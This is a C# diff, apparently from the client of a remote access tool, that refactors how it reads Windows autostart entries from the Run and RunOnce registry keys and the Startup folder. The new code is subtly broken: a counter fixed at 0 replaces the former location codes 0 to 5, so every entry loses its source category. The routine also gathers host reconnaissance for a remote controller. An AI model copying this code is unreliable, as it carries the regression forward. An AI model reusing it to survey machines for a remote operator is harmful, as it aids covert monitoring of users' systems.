@@ -6,6 +6,7 @@ using System.Windows.Forms;
 using Microsoft.Win32;
 using xClient.Core.Information;
 using xClient.Core.RemoteShell;
+using xClient.Core.Extensions;
 
 namespace xClient.Core.Commands
 {
@@ -56,96 +57,75 @@ namespace xClient.Core.Commands
             try
             {
                 Dictionary<string, int> startupItems = new Dictionary<string, int>();
+                int i = 0;
 
-                using (
-                    var key = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
-                        false))
+                using (var key = Registry.LocalMachine.OpenReadonlySubKeySafe("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"))
                 {
                     if (key != null)
                     {
-                        foreach (var k in key.GetValueNames())
+                        foreach (string formattedKeyValue in key.GetFormattedKeyValues())
                         {
-                            if (string.IsNullOrEmpty(k) || key.GetValue(k) == null) continue;
-                            startupItems.Add(string.Format("{0}||{1}", k, key.GetValue(k)), 0);
+                            startupItems.Add(formattedKeyValue, i);
                         }
                     }
                 }
-                using (
-                    var key = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
-                        false))
+                using (var key = Registry.LocalMachine.OpenReadonlySubKeySafe("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
                 {
                     if (key != null)
                     {
-                        foreach (var k in key.GetValueNames())
+                        foreach (string formattedKeyValue in key.GetFormattedKeyValues())
                         {
-                            if (string.IsNullOrEmpty(k) || key.GetValue(k) == null) continue;
-                            startupItems.Add(string.Format("{0}||{1}", k, key.GetValue(k)), 1);
+                            startupItems.Add(formattedKeyValue, i);
                         }
                     }
                 }
-                using (
-                    var key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", false)
-                    )
+                using (var key = Registry.CurrentUser.OpenReadonlySubKeySafe("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"))
                 {
                     if (key != null)
                     {
-                        foreach (var k in key.GetValueNames())
+                        foreach (string formattedKeyValue in key.GetFormattedKeyValues())
                         {
-                            if (string.IsNullOrEmpty(k) || key.GetValue(k) == null) continue;
-                            startupItems.Add(string.Format("{0}||{1}", k, key.GetValue(k)), 2);
+                            startupItems.Add(formattedKeyValue, i);
                         }
                     }
                 }
-                using (
-                    var key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
-                        false))
+                using (var key = Registry.CurrentUser.OpenReadonlySubKeySafe("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
                 {
                     if (key != null)
                     {
-                        foreach (var k in key.GetValueNames())
+                        foreach (string formattedKeyValue in key.GetFormattedKeyValues())
                         {
-                            if (string.IsNullOrEmpty(k) || key.GetValue(k) == null) continue;
-                            startupItems.Add(string.Format("{0}||{1}", k, key.GetValue(k)), 3);
+                            startupItems.Add(formattedKeyValue, i);
                         }
                     }
                 }
                 if (OSInfo.Bits == 64)
                 {
-                    using (
-                        var key =
-                            Registry.LocalMachine.OpenSubKey(
-                                "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run",
-                                false))
+                    using (var key = Registry.LocalMachine.OpenReadonlySubKeySafe("SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run"))
                     {
                         if (key != null)
                         {
-                            foreach (var k in key.GetValueNames())
+                            foreach (string formattedKeyValue in key.GetFormattedKeyValues())
                             {
-                                if (string.IsNullOrEmpty(k) || key.GetValue(k) == null) continue;
-                                startupItems.Add(string.Format("{0}||{1}", k, key.GetValue(k)), 4);
+                                startupItems.Add(formattedKeyValue, i);
                             }
                         }
                     }
-                    using (
-                        var key =
-                            Registry.LocalMachine.OpenSubKey(
-                                "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
-                                false))
+                    using (var key = Registry.LocalMachine.OpenReadonlySubKeySafe("SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
                     {
                         if (key != null)
                         {
-                            foreach (var k in key.GetValueNames())
+                            foreach (string formattedKeyValue in key.GetFormattedKeyValues())
                             {
-                                if (string.IsNullOrEmpty(k) || key.GetValue(k) == null) continue;
-                                startupItems.Add(string.Format("{0}||{1}", k, key.GetValue(k)), 5);
+                                startupItems.Add(formattedKeyValue, i);
                             }
                         }
                     }
                 }
                 if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup)))
                 {
-                    var files =
-                        new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.Startup)).GetFiles();
+                    var files = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.Startup)).GetFiles();
+
                     foreach (var file in files)
                     {
                         if (file.Name != "desktop.ini")
